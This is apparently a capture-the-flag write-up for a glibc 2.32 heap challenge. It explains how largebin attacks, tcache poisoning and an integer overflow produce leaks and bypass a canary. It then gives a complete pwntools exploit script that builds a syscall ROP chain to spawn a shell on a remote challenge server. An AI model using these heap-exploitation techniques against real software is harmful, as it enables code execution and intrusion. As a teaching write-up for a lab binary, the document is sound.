# house of the rising sun

###### This was a heap challenge with the difficulty of hard
#
Let's look at the file with checksec:
```
[*] './a.out'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
If we run the binary, we get a libc leak given and we immedeatly see the functionality. A classical note taking
program. This is also a libc 2.32 heap challenge, which makes it harder due some protections from libc. But there
are also some custom protections, like canary, size check, some kind of tcache chunk restriction. Also you cannot
double free or show already free'd chunks. But hey, at least we get a pie leak gifted ;) . So there are probably not
many attacks left, however we can attack the global variables and arrays in the bss with a couple of largebin
attacks, to show already free chunks and defeat the canary randomisation. Note: after every laregebin attack we
have to fix the linked list, otherwise our program will crash. But that will be no problem, because after the first
largebin attack we already got pie and libc leak. Sadly we can't hijack `__malloc_hook` or `__free_hook`,
because they are zeroed out before every malloc and free. Also we have to get a stack leak to get the passwd for the
flag file. So this tells us to attack the stack probably. But first of all, we need a stack leak, which we will get by
writing a pointer to a stack address into the pointers array with tcache poisioning and an integrer overflow in the
create function. We also have to write the right size and canary to the right offset of that pointer, so that we don't
abort. That will need 3 tcache attacks in total. After that we attack the saved rip with another tcache poisioning
attack to create a ropchain which get's the password for us. Because the password isn't random we don't have to do
that again. So then we need to get a shell. We won't use any libc function, because some of them are pached out.
We just craft a syscall ropchain to get the shell. Now if we execute the script, we get a shell and we can enter the
password in that check program. We get the flag, nice! Here is the script:
```python
from pwn import *

def create(idx, sz, data):
  p.sendline("1")
  p.sendlineafter("index:",str(idx))
  p.sendlineafter("size:",str(sz))
  p.sendlineafter("input:",data)

def edit(idx, data):
  p.sendline("2")
  p.sendlineafter("",str(idx))
  p.sendlineafter("input:",data)

def show(idx):
  p.sendline("3")
  p.sendlineafter("index:",str(idx))

def delete(idx):
  p.sendline("4")
  p.sendlineafter("index:",str(idx))

def mask(heap_base,target):
 return (heap_base >> 0xc ) ^ target

while True:
    try:
        #p = process("./a.out",env={"LD_PRELOAD":"./libc.so.6"})
        p = remote("13.126.21.122",49169)

        p.sendline("a")
        sleep(2)
        leak = p.recv().split()
        sleep(2)
        pie_leak = u64(leak[-16].rjust(6, "\x0a").ljust(8, "\x00"))

        pie_base = pie_leak - 0x12f9
        seed = pie_base + 0x50db
        inuse_arr = pie_base + 0x5143
        chunks_arr = pie_base + 0x5060
        bss = pie_base + 0x5000
        pop_rdi = pie_base + 0x2023

        # get heap and libc leak with largebin attack

        create(0,0x28,"/bin/sh\x00")
        create(0,0x428,"AAAA")
        create(1,0x410,"AAAA")
        create(2,0x418,"AAAA")
        create(3,0x410,"AAAA")
        delete(0)
        create(4,0x438,"AAAA")
        delete(2)
        edit(0,"A"*24+p64(inuse_arr-0x20))
        create(5,0x438,"AAAA")

        show(0)

        p.recvuntil("data: ")
        heap_leak = u64(p.recvline()[:6].ljust(8, "\x00"))
        heap_base = heap_leak - 0xb30
        tcache_ptr = heap_base + 0x10
        tcache_chunk = heap_base + 0x740
        chunk_idx_2 = heap_leak
        chunk_idx_0 = heap_leak - 0x850
        cmd = heap_base + 0x2c0

        show(2)

        p.recvuntil("data: ")
        libc_leak = u64(p.recvline()[:6].ljust(8, "\x00"))
        main_arena_1104 = libc_leak
        libc_base = libc_leak - 0x1e3ff0
        stdin = libc_base + 0x1e39a0
        stdout = libc_base + 0x1e46c0
        stderr = libc_base + 0x1e45e0
        environ = libc_base + 0x1e7600
        gets = libc_base + 0x802e0
        pop_rax = libc_base + 0x45580
        pop_rsi = libc_base + 0x2ac3f
        pop_rdx_rbx = libc_base + 0x1597d6
        syscall = libc_base + 0x26858

        # fix linked list

        edit(0,p64(chunk_idx_2)+p64(main_arena_1104)+p64(chunk_idx_2)+p64(chunk_idx_2))
        edit(2,p64(main_arena_1104)+p64(chunk_idx_0)+p64(chunk_idx_0)+p64(chunk_idx_0))

        delete(5)
        delete(4)
        delete(3)
        delete(1)

        # defeat canary with largebin attack

        create(0,0x428,"AAAA")
        create(1,0x410,"AAAA")
        create(2,0x418,"AAAA")
        create(3,0x410,"AAAA")
        delete(0)
        create(4,0x438,"AAAA")
        delete(2)
        edit(0,"A"*24+p64(seed-0x20))
        create(5,0x438,"AAAA")

        # fix linked list

        edit(0,p64(chunk_idx_2)+p64(main_arena_1104)+p64(chunk_idx_2)+p64(chunk_idx_2))
        edit(2,p64(main_arena_1104)+p64(chunk_idx_0)+p64(chunk_idx_0)+p64(chunk_idx_0))

        delete(5)
        delete(4)
        delete(3)
        delete(1)

        canary = 0xbdb61800

        # do tcache poisioning on environ-0x8 to pass the size check

        create(0,0x410,"AAAA")
        create(1,0x28,"AAAA")
        create(2,0x28,"AAAA")
        delete(2)
        delete(1)
        delete(0)
                # abuse integer overflow
        create(0,0xffff+0x410,"A"*0x403+p32(canary)+"A"+p64(0x0)+p64(0x420)+p64(0x31)+p64(mask(heap_base,environ-0x10))+p64(tcache_ptr))

        create(3,0x28,"AAAA")
        create(4,0x28,"A"*0x8+p16(0x421)+"\x00\x00\x00\x00\x00")

        # do tcache poisioning on environ+len-0xc to pass the canary check

        create(0,0x410,"AAAA")
        create(1,0x28,"AAAA")
        create(2,0x28,"AAAA")
        delete(2)
        delete(1)
        delete(0)
        # abuse integer overflow
        create(0,0xffff+0x410,"A"*0x403+p32(canary)+"A"+p64(0x0)+p64(0x420)+p64(0x31)+p64(mask(heap_base,environ+0x420-0x20))+p64(tcache_ptr))

        create(3,0x28,"AAAA")
        create(4,0x28,"AAA"+p32(canary)*3)

        # do tcache poisioning on the chunk ptr array to finally get stack leak

        create(0,0x410,"AAAA")
        create(1,0x78,"AAAA")
        create(2,0x78,"AAAA")
        delete(2)
        delete(1)
        delete(0)
        # abuse integer overflow
        create(0,0xffff+0x410,"A"*0x403+p32(canary)+"A"+p64(0x0)+p64(0x420)+p64(0x81)+p64(mask(heap_base,bss+0x1))+p64(tcache_ptr))

        create(3,0x78,"AAAA")
        create(4,0x78,"\x00"*8+p64(bss+0x8)+p64(0x0)*2+p64(stdout)+p64(0x0)+p64(stdin)+p64(0x0)+p64(stderr)+p64(0x0)*3+p64(environ))

        # get stack leak

        show(0)
        p.recvuntil("data: ")
        stack_leak = u64(p.recvline()[:6].ljust(8, "\x00"))
        saved_rip = stack_leak - 0x100
        saved_rbp = saved_rip - 0x8
        passwd = stack_leak - 0x128


        log.success("got all leaks!")
        log.info("pie: " + hex(pie_base))
        log.info("heap: " + hex(heap_base))
        log.info("libc: " + hex(libc_base))
        log.info("stack: " + hex(passwd))

        # write to saved rip

        create(0,0x410,"AAAA")
        create(1,0x78,"AAAA")
        create(2,0x78,"AAAA")
        delete(2)
        delete(1)
        delete(0)
        create(0,0xffff+0x410,"A"*0x403+p32(canary)+"A"+p64(0x0)+p64(0x420)+p64(0x81)+p64(mask(heap_base,saved_rbp+0x1))+p64(tcache_ptr))

        create(3,0x78,"AAAA")
        # leak flag password
        #create(4,0x78,"A"*8 + p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(0x1) + p64(pop_rsi) + p64(passwd) + p64(pop_rdx_rbx) + p64(0x10)*2 + p64(syscall))
        # get shell
        create(4,0x78,"A"*8 + p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(cmd) + p64(pop_rsi) + p64(0x0) + p64(pop_rdx_rbx) + p64(0x0)*2 + p64(syscall))
        p.sendline("5")
        break

    except:
        p.close()


p.interactive()
```
###### The script isn't 100% reliable, so I added a while loop. Just run the script and wait a bit!
